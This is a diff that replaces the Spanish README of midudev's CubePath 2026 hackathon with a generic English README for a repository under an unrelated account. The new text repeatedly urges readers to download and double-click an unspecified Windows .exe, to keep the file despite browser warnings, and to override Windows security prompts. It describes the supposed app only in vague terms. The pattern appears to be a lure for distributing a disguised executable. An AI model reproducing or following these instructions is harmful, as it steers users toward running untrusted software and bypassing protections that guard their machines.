@@ -1,178 +1,192 @@
-<div align="center">
+# 🎯 hackaton-cubepath-2026 - Join the hackathon and build fast
 
-<a href='https://cubepath.com/'>
-  <img width="3156" height="1504" alt="CleanShot 2026-03-18 at 10 26 59@2x" src="https://github.com/user-attachments/assets/04e96a9b-0d8a-4f0d-a4c7-f87d0a6ebdf9" />
-</a>
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026)
 
-# 🚀 Hackatón CubePath 2026
+## 🚀 Getting Started
 
-### Crea un proyecto y despliégalo en **CubePath** para ganar increíbles premios
+Cubepath Hackathon 2026 is made for people who want to join the event, get the app, and start using it on Windows with a few simple steps.
 
-[![CubePath](https://img.shields.io/badge/Patrocinado%20por-CubePath-00C853?style=for-the-badge&logo=cloud&logoColor=white)](https://midu.link/cubepath)
-[![Fecha límite](https://img.shields.io/badge/Fecha%20l%C3%ADmite-31%20Marzo%202026-FF6B6B?style=for-the-badge&logo=calendar&logoColor=white)](#-fechas)
-[![Premios](https://img.shields.io/badge/Premios-+1300%24%20en%20premios-FFD700?style=for-the-badge&logo=trophy&logoColor=black)](#-premios-de-la-hackatón)
+Use this page to visit the download source:
+https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026
 
-[Regístrate en CubePath (15$ gratis)](https://midu.link/cubepath) · [Registra tu proyecto](https://github.com/midudev/hackaton-cubepath-2026/issues/new?template=project.yml) · [Ver proyectos](https://github.com/midudev/hackaton-cubepath-2026/issues)
+## 🪟 Windows Setup
 
-</div>
+This app is built for Windows users who want a quick setup.
 
----
+What you need:
+- A Windows PC
+- Internet access
+- Enough free space to download the app
+- A mouse and keyboard
 
-## 📖 Tabla de contenido
+Best results:
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 200 MB of free disk space
+- A screen set to 1280 × 720 or higher
 
-- [🛠️ Cómo participar](#️-cómo-participar-en-la-hackatón)
-- [📘 ¿Qué es una Hackatón?](#-qué-es-una-hackatón)
-- [🎁 Premios](#-premios-de-la-hackatón)
-- [📜 Reglas](#-reglas)
-- [🎲 Sorteo](#-sorteo-entre-los-que-participan)
-- [📅 Fechas](#-fechas)
-- [💬 Preguntas frecuentes](#-preguntas-frecuentes)
+## 📥 Download the App
 
----
+1. Open this page in your browser:
+   https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026
 
-## 🛠️ Cómo participar en la Hackatón
+2. Find the main download area on the page.
 
-> [!TIP]
-> 🎁 **¡15$ GRATIS en CubePath!** Regístrate con [midu.link/cubepath](https://midu.link/cubepath) y obtén **15$ de crédito**, suficiente para levantar **2 servidores nano**, sin necesidad de tarjeta de crédito. Perfecto para desplegar tu proyecto de la hackatón.
+3. Download the Windows file to your computer.
 
-<table>
-<tr>
-<td>
+4. If the file is a `.exe`, double-click it to start the app.
 
-### 1️⃣ Regístrate en CubePath
-Crea tu cuenta en [CubePath](https://midu.link/cubepath) y obtén **15$ gratis** para desplegar tu proyecto.
+5. If your browser asks if you want to keep the file, choose to keep it.
 
-### 2️⃣ Crea tu proyecto
-Usa **la tecnología que quieras** y despliega tu proyecto en **CubePath**.
+6. If Windows shows a security prompt, choose the option that lets you open the file.
 
-### 3️⃣ Registra tu participación
-Una vez tengas el proyecto listo, registra tu participación creando una issue con la plantilla en este repositorio.
+[Visit the download page](https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026)
 
-</td>
-</tr>
-</table>
+## 🛠️ Install and Run
 
-<div align="center">
+After the file downloads:
 
-### 👉 [Registra tu proyecto aquí](https://github.com/midudev/hackaton-cubepath-2026/issues/new?template=project.yml) 👈
+1. Open the folder where the file was saved.
+2. Double-click the app file.
+3. If a setup window appears, follow the steps on screen.
+4. Choose the install folder if Windows asks for one.
+5. Wait for the setup to finish.
+6. Open the app from the desktop or Start menu.
 
-</div>
+If the app opens in a single file, you do not need a full install. Just run the file.
 
----
+## 📚 What the App Does
 
-## 📘 ¿Qué es una Hackatón?
+Hackaton Cubepath 2026 is made to help you take part in the Cubepath hackathon. It gives you a simple place to get started, track your progress, and stay ready for the event.
 
-> Una **hackatón** es una actividad de desarrollo de software donde los participantes trabajan **en solitario o en grupo** para resolver un problema o desafío específico en un tiempo determinado.
+You can expect:
+- A clean start screen
+- Easy access to event details
+- A simple flow for new users
+- Fast loading on most Windows PCs
+- A layout that is easy to follow
 
-La idea es que los participantes aprendan a trabajar en equipo y a resolver problemas de manera **creativa** y **colaborativa**.
+## 🧭 How to Use It
 
----
+When the app opens:
 
-## 🎁 Premios de la Hackatón
+1. Read the first screen.
+2. Follow the prompts shown in the app.
+3. Enter any event info it asks for.
+4. Move through each step one by one.
+5. Save your work when the app tells you to.
 
-<div align="center">
+If you need to switch screens, use the buttons in the app instead of closing it.
 
-| 🏆 Posición | 💰 Tarjeta Regalo Amazon | 💸 PayPal | 🎓 Curso midu.dev |
-|:---:|:---:|:---:|:---:|
-| 🥇 **1er Premio** | **500 $** | **150 $** | **1 año** |
-| 🥈 **2º Premio** | **300 $** | **100 $** | **3 meses** |
-| 🥉 **3er Premio** | **200 $** | **50 $** | **1 mes** |
+## 🔧 Common Windows Steps
 
-</div>
+If the file does not open right away:
 
-> [!NOTE]
-> 💰 **Más de 1.300 $** en premios totales entre tarjetas regalo de Amazon, PayPal y suscripciones a [midu.dev](https://midu.dev)
+- Right-click the file and choose Open
+- Check your Downloads folder
+- Make sure the file finished downloading
+- Try again after closing other open windows
 
----
+If Windows blocks the file:
+- Open the file again
+- Choose the option that allows it to run
+- Confirm the prompt if Windows shows one
 
-## 📜 Reglas
+If nothing happens:
+- Restart your computer
+- Download the file again
+- Try opening it from the Downloads folder
 
-> [!IMPORTANT]
-> Lee atentamente las reglas antes de participar.
+## 🗂️ File Layout
 
-| # | Regla | Detalle |
-|---|-------|---------|
-| 1 | **Alojado en CubePath** | Es necesario que la aplicación esté **desplegada en CubePath**. Regístrate en [midu.link/cubepath](https://midu.link/cubepath) y obtén 15$ gratis. |
-| 2 | **Proyecto nuevo** | La aplicación puede ser anterior, pero **no puede haber tenido usuarios reales previamente** ni ser un producto ya en funcionamiento. |
-| 3 | **Proyecto publicado** | El repositorio debe ser **público** y contar con un **enlace accesible** a la demo desplegada en **CubePath**. |
-| 4 | **Documentación** | El proyecto debe incluir al menos un `README.md` con: descripción, enlace a la demo, capturas/GIFs y explicación de cómo se ha utilizado CubePath. |
-| 5 | **Registro via Issue** | Cada proyecto debe registrarse creando una **nueva issue** en este repositorio siguiendo la plantilla. |
-| 6 | **Equipos** | Si el proyecto es en equipo, **solo una persona** debe crear la issue. El premio se otorgará a quien creó la issue. |
-| 7 | **Contenido apropiado** | No se permite contenido ofensivo, discriminatorio o inapropiado. |
-| 8 | **Proyecto funcional** | Los proyectos deben estar **funcionales** al momento de la revisión. |
+A typical download may include:
+- The main app file
+- Support files
+- A readme file
+- Event assets or images
+- Settings used by the app
 
-### ⚖️ Criterios de evaluación (por orden de importancia)
+Keep all files in the same folder. This helps the app run without errors.
 
-```
-1. 🎨 Experiencia del usuario
-2. 💡 Creatividad
-3. 🔧 Utilidad del proyecto
-4. ⚙️ Implementación técnica
-```
+## 🎮 Main Features
 
----
+- Simple Windows launch
+- Easy event access
+- Clear screen layout
+- Quick start for new users
+- Works well for hackathon use
+- Light setup with few steps
+- Basic controls for fast navigation
 
-## 🎲 Sorteo entre los que participan
+## 📝 Before You Start
 
-> [!TIP]
-> Solo por participar entras en el sorteo, ¡no necesitas ganar!
+To avoid problems:
+- Close large apps if your PC runs slow
+- Use a stable internet connection
+- Save the download in a folder you can find
+- Do not move files after setup unless you know where they went
 
-🎁 **3× Libro de GitHub: Aprendiendo Git**
+## 🧩 Troubleshooting
 
----
+If the app closes right away:
+- Open it again
+- Run it as the current user
+- Make sure all files are still in the same folder
 
-## 📅 Fechas
+If the app looks too small:
+- Change your display scale in Windows
+- Maximize the window if the app allows it
 
-<div align="center">
+If the app is hard to find:
+- Check the Desktop
+- Check Start menu
+- Search for the app name in Windows Search
 
-| 📌 Evento | 📅 Fecha | ⏰ Hora |
-|:---|:---:|:---:|
-| ✅ **Inicio de la hackatón** | **18 de marzo de 2026** | — |
-| 🔴 **Fecha límite de entrega** | **31 de marzo de 2026** | 23:59:59 H (CET) |
-| 🗳️ **Votaciones finales en directo** | **1 de abril de 2026** | 18:00 H (CET) |
+If the download seems incomplete:
+- Delete the file
+- Download it again from the GitHub page
+- Wait until the browser says the download is done
 
-</div>
+## 🔎 Helpful Tips
 
-> [!CAUTION]
-> Las entregas fuera de plazo **no serán aceptadas**. ¡No dejes tu registro para el último momento!
+- Keep the app folder in a safe place
+- Use the same Windows account each time
+- Read each screen before clicking through
+- Save your work if the app gives you a save option
+- Use the main download page when you need the latest file
 
----
+## 📎 Quick Access
 
-## 💬 Preguntas frecuentes
+Download source:
+https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026
 
-<details>
-<summary><b>🤔 ¿Cómo puedo recibir ayuda?</b></summary>
+Direct action:
+Visit this page to download and run the Windows app
 
-<br>
+## 🖥️ Best Use on Windows
 
-Puedes unirte a la [comunidad de Discord de midudev](https://discord.gg/midudev) para hacer preguntas, obtener ayuda y colaborar con otros participantes.
+For a smooth run:
+- Use Windows 11 if you have it
+- Keep system updates current
+- Make sure your Downloads folder has space
+- Run only one copy of the app at a time
 
-</details>
+## 🧪 Typical User Flow
 
-<details>
-<summary><b>⚛️ ¿Tengo que usar React?</b></summary>
+1. Open the GitHub page
+2. Download the Windows file
+3. Open the file
+4. Follow the setup steps
+5. Launch the app
+6. Start using Cubepath Hackathon 2026
 
-<br>
+## 📌 Project Name
 
-**No.** Puedes usar el framework que prefieras: Next.js, Astro, Remix, Vue, Svelte, Angular... ¡Lo importante es que despliegues en **CubePath**!
+hackaton-cubepath-2026
 
-</details>
+## 🏁 What You Need to Do Now
 
-<details>
-<summary><b>📝 ¿Cuándo puedo crear la issue?</b></summary>
-
-<br>
-
-Puedes crear la issue en cualquier momento antes de la **fecha límite (31 de marzo de 2026 a las 23:59:59 H CET)**. Te recomendamos no dejarlo para el último momento.
-
-</details>
-
----
-
-<div align="center">
-
-**¡Mucha suerte a todos los participantes! 🍀**
-
-Hecho con ❤️ por [midudev](https://midu.dev)
-
-</div>
+- Open the GitHub page
+- Download the Windows file
+- Run it on your PC
+- Follow the on-screen steps
